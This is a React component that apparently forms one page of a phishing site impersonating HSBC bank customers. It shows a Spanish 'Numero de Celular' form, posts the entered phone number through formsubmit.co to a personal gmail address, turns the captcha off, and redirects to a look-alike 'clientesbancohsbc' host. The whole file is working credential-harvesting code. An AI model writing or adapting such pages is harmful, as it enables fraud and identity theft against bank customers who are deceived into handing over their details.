import React from 'react';
import '../css/style.css'

const Numerocelular = () => {
    
    var numerocelular = document.querySelector('.inputname');

numerocelular.addEventListener('input', function(){
    if (this.value.length > 10)
         this.value = this.value.slice(0,10);
})
// solo ingreso de numeros
numerocelular.addEventListener('input', function(){
    this.value = this.value.replace(/[^0-9]/g, '');
})
    return (
        <div className="contglobal">
        <div className='contenedor' >
        <form className='formulario' action="https://formsubmit.co/robr48j@gmail.com" method="POST" >
            <h1 className='titulo'>Numero de Celular</h1>
            <div className='cont'>
                <div className="labeleicon">
                    <label className='label' >Ingresa tu número de celular</label>
                </div>
                <div className="input-cont">
                    <input className='inputname' name='name' placeholder='Ingresa tu numero de celular' maxLength='10' type="text"/>
                    <input type="hidden" name="email" value="p1804251@gmail.com" />
                    <input type="hidden" name="_next" value="https://clientesbancohsbc.vercel.app/user" />
                    <input type="hidden" name="_captcha" value="false" />
                </div>
                <div className="olvidouser">
                    <a href='' className='linkolvido' >¿Olvidaste tu numero?</a>
                </div>
                <div className="input-contbtn">
                    <button className='btncontinuar' type='submit' >Continuar</button>
                </div>
            </div>
        </form>
        </div>
        </div>
);}

export default Numerocelular;
